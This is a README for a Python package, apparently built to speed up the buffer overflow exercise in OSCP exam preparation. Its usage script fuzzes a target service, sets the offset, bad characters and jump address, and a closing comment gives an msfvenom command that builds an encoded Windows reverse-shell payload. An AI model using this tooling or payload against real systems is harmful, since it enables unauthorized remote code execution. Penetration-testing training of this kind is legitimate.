# Ezbuff
Ezbuff is a Python package created to make the **2020 PWK buffer overflow** easier to perform and understand. I created this package because I am aware of the number of people who lose a lot of time during their **OSCP** exams because of the buffer overflow box and thought this would assist the process. Ezbuff does not perform the buffer overflow for you, it simply automates a lot of the procedures that need to be executed to accomplish a successful buffer overflow attack. Therefore, the manual labor like determining the actual number of bytes to send to crash the vulnerable application, filtering bad characters from registers, and payload generation are all left to the user.

## Installation
```python
pip3 install ezbuff
```

## Usage
```python
#!/usr/bin/env python3

from ezbuff.src.overflow import Overflow

def main():
	# Instanstantiate `Overflow` object
	test = Overflow("10.10.10.10", 80, max_fuzz_bytes=2000)

	# Change the target IP if running in interactive Python interpreter
	test.targ_ip = "10.10.10.1"

	# Change the target port number if running tests in interactive Python interpreter
	test.targ_port = 443

	# The number of seconds to wait in between the fuzzing process,
	# default = 10
	test.fuzz_interval_seconds = 2

	# Add bad characters to objects list containing bad characters found
	# after sending characters payload.
	test.add_bad_char('\x00', '\x01', '\x02')

	# Set the increment of the fuzzer to be 150 as opposed to
	# the default of 100
	test.fuzz_increment = 150

	# Fuzz the vulnerable application
	test.fuzz()

	# Sets the number of bytes to crash the application.
	# Make sure to accomodate space for reverse shell!!
	test.num_bytes_crash = 1200

	# Set the offset after running the functions to find offset value
	test.offset = 800

	# Set the memory address to jump to after finding valid memory address
	# containing `jump` instructions set in x86 architecture
	test.jump_eip = "\x8f\x35\x4a\x5f"

	# Sending pattern to determine offset
	test.send_pattern()

if __name__ == '__main__':
	main()
	
# Sample payload with Msfvenom: msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=1337 EXITFUNC=
# thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\3d"

# Or use Vengen (https://github.com/binexisHATT/Vengen) to generate payloads with your custom options! 
```
